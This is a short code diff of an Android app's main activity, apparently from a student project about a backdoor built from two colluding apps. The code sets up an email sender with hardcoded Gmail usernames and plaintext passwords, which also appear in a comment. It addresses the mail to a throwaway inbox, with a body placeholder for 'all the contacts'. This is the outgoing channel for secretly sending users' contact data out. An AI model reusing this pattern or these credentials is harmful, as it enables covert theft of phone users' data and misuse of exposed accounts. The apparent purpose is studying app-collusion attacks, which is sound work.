@@ -26,13 +26,16 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // collusion.enseirb@gmail.com CollEGL21
-        // it362.test2021@gmail.com enseirbtest
+        /**
+         * Creds
+         * collusion.enseirb@gmail.com CollEGL21
+         * it362.test2021@gmail.com enseirbtest
+         */
 
         newBuilder(this)
-            .withUsername("it362.test2021@gmail.com") //
+            .withUsername("it362.test2021@gmail.com")
             .withPassword("enseirbtest")
-            .withMailto("it362.test2021@yopmail.com") // collusion.enseirb@gmail.com
+            .withMailto("it362.test2021@yopmail.com")
             .withType(TYPE_PLAIN)
             .withSubject("Android project")
             .withBody("<TODO: Put all the contacts here>\nSource Code: https://gitlab.com/sstan001/two-apps-one-backdoor")
